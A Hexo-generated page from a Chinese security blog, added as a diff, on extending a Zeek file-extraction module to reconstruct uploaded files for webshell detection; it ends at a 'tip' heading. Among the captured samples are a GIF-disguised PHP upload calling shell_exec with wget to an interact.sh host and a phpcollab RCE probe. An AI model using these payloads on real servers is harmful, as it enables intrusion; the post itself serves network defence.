@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;example.com&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Mist&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:false,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:true,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:false,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;搜索...&quot;,&quot;empty&quot;:&quot;没有找到任何搜索结果：${query}&quot;,&quot;hits_time&quot;:&quot;找到 ${hits} 个搜索结果（用时 ${time} 毫秒）&quot;,&quot;hits&quot;:&quot;找到 ${hits} 个搜索结果&quot;},&quot;path&quot;:&quot;&#x2F;search.xml&quot;,&quot;localsearch&quot;:{&quot;enable&quot;:true,&quot;trigger&quot;:&quot;auto&quot;,&quot;top_n_per_article&quot;:1,&quot;unescape&quot;:false,&quot;preload&quot;:false}}</script>
+<meta name="description" content="背景最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。 下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zeek - File Extraction Plus">
+<meta property="og:url" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/index.html">
+<meta property="og:site_name" content="Canon&#39;s Blog">
+<meta property="og:description" content="背景最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。 下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png">
+<meta property="og:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png">
+<meta property="og:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png">
+<meta property="og:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png">
+<meta property="og:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png">
+<meta property="article:published_time" content="2021-12-31T03:09:16.000Z">
+<meta property="article:modified_time" content="2021-12-31T08:26:03.000Z">
+<meta property="article:author" content="Canon">
+<meta property="article:tag" content="Zeek">
+<meta property="article:tag" content="NTA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png">
+
+
+<link rel="canonical" href="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;zh-CN&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;12&#x2F;31&#x2F;Zeek-File-Extraction-Plus&#x2F;&quot;,&quot;path&quot;:&quot;2021&#x2F;12&#x2F;31&#x2F;Zeek-File-Extraction-Plus&#x2F;&quot;,&quot;title&quot;:&quot;Zeek - File Extraction Plus&quot;}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
+<title>Zeek - File Extraction Plus | Canon's Blog</title><script src="/js/config.js"></script>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Canon's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%9E%E6%B3%95%E6%80%BB%E6%AF%94%E5%9B%B0%E9%9A%BE%E5%A4%9A"><span class="nav-number">2.</span> <span class="nav-text">办法总比困难多</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E6%94%B9%E8%BF%9B"><span class="nav-number">3.</span> <span class="nav-text">做了哪些改进</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="nav-number">4.</span> <span class="nav-text">项目地址</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Canon</p>
+  <div class="site-description" itemprop="description">一个热爱健身的安全分析师</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Canon">
+      <meta itemprop="description" content="一个热爱健身的安全分析师">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Canon's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Zeek - File Extraction Plus
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-12-31 11:09:16 / 修改时间：16:26:03" itemprop="dateCreated datePublished" datetime="2021-12-31T11:09:16+08:00">2021-12-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。</p>
+<p>下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发FIM事件的必要条件是指定监控目录。那么，当你拿着从CMDB筛选出的Web服务器给到运维询问Web路径时，你很可能无法得到你想要的答案。对于这种路径不统一的情况，你可以选择自己人工手动收集并维护，如果面对上千台的服务器，那会花费大量的时间成本，或者你可以选择将问题上升推进整改（这条“路”不好走啊😂）。</p>
+<h4 id="办法总比困难多"><a href="#办法总比困难多" class="headerlink" title="办法总比困难多"></a>办法总比困难多</h4><p>都说上帝为你关了一扇门，必定会为你打开一扇窗。某天在写代码时看到Twitter推了一条Zeek的动态，此时，我悟了😅！纠结个毛的路径？我直接把需要的数据在NTA上还原出来不就得了，只需将EDR装在NTA上并监控文件还原的目录即可。至于我为啥选择Zeek没用Suricata，主要还是因为Zeek可定制化程度比Suricata更高一些。另外一点Zeek支持集群化部署，规则可以直接由Manager统一下发，这点要比Suricata方便很多，当然这也得益于集群的优势。</p>
+<p>说回文件还原的事儿，Zeek上已经有 “前人” (<strong><a target="_blank" rel="noopener" href="https://github.com/hosom/file-extraction/actions"><em>hosom</em></a></strong>) 写过一个文件还原的模块。不过在使用中也发现了一些不太贴合我这边实际场景的情况，好在Zeek非常的“<strong>Open</strong>”😁只需要稍加改动就可以满足我的需求了。</p>
+<h4 id="做了哪些改进"><a href="#做了哪些改进" class="headerlink" title="做了哪些改进"></a>做了哪些改进</h4><ul>
+<li><p>去其糠糟，取其精华</p>
+<p>Zeek 和 Suricata 记录日志的方式比较相似，都是根据事件类型来记录日志。正因如此，若想对文件还原事件进行溯源，还需借助协议解析日志来进行上下文的关联。例如，通过HTTP协议还原的文件，就需要借助<code>http.log</code>。由于在我的实际环境中HTTP流量很大，如果不对协议解析的事件做过滤的话，那么输出的日志量会非常的“恐怖”。因此，我做了一些优化，现在只有当匹配到文件还原事件后，才会输出对应的协议解析事件。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/file-extension-logs.zeek">file-extension-logs.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record Files::Info += &#123;</span><br><span class="line">      flags:      <span class="built_in">string</span>      &amp;<span class="keyword">default</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">Files::log_policy</span><span class="params">(rec: Files::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$flags == <span class="string">&quot;&quot;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(Files::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;file_extraction&quot;</span>, $path=<span class="string">&quot;file-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(Files::LOG, filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record HTTP::Info += &#123;</span><br><span class="line">      records:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F;</span><br><span class="line">      domain:     <span class="built_in">string</span>      &amp;optional &amp;<span class="built_in">log</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$records == F )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(HTTP::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(HTTP::LOG, filter);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">export</span> &#123;</span><br><span class="line">      global http: function(f: fa_file): fa_file;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      f$http$records = T;</span><br><span class="line">      f$http$domain = f$http$host;</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 - 1</strong></p>
+<p>**<a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a>**，负责记录命中文件还原的协议解析事件，后期通过将2个事件fuid字段进行关联，可以帮助我们更好的去分析整个事件。</p>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png" alt="image-20211101202304818"></p>
+</li>
+<li><p>更灵活，更强大</p>
+<p>​    支持根据文件类型选择<strong>hash</strong>或者<strong>extract</strong> </p>
+<p>​    <strong>hash</strong>: 只计算文件的HASH但不对此文件进行提取；</p>
+<p>​    <strong>extract</strong>: 还原指定类型的文件。支持针对HTTP协议，可选域名、URI、请求方法等字段组合进行提取，文件还原后按照日期存储；</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/extract-custom.zeek">extract-custom.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FileExtraction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_types: <span class="built_in">set</span>[<span class="built_in">string</span>, <span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;text/x-php&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-pdf&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_extract: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;POST&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;extract&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;extract&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;hash&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;hash&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::http_extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( f$http?$host &amp;&amp; f$http?$method &amp;&amp; f$http?$uri &amp;&amp; f$info$is_orig )</span><br><span class="line">            <span class="keyword">if</span> ( [f$http$method] in custom_extract )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        f$info$flags = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/store-files-by-md5.zeek">store-files-by-md5.zeek</a></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line">@load policy/frameworks/files/hash-all-files</span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtraction::path == <span class="string">&quot;&quot;</span> )</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">	<span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 按照日期进行文件的还原存储</span></span><br><span class="line">	<span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">	<span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">	<span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtraction::path, ndate);</span><br><span class="line">	mkdir(dest_dir);</span><br><span class="line">	<span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s-%s.%s&quot;</span>, dest_dir, f<span class="variable">$source</span>, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s %s&quot;</span>, orig, dest);</span><br><span class="line">	when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">	    &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( rename(orig, dest) )</span><br><span class="line">    	f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>示例 - 2</strong></p>
+<ul>
+<li>Zeek - Files</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png" alt="image-20211101213845765"></p>
+<ul>
+<li>​    Zeek - HTTP</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png" alt="image-20211101220829730"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-2f48899b463009a77234056c62f5c4fb.gif</span><br><span class="line">GIF89a213213123&lt;?php shell_exec(<span class="string">&quot;wget -c http://c5vi7ua23aksl756fsdgcf9186ayyyyoy.interact.sh&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 - 3</strong></p>
+<ul>
+<li>Zeek - Files</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png" alt="image-20211101214516921"></p>
+<ul>
+<li>Zeek - HTTP</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png" alt="image-20211101214915506"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-c77da62fa1b8f687ea423581657dcc2c.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(<span class="string">&#x27;phpcollab_rce&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>小提示：</strong></p>
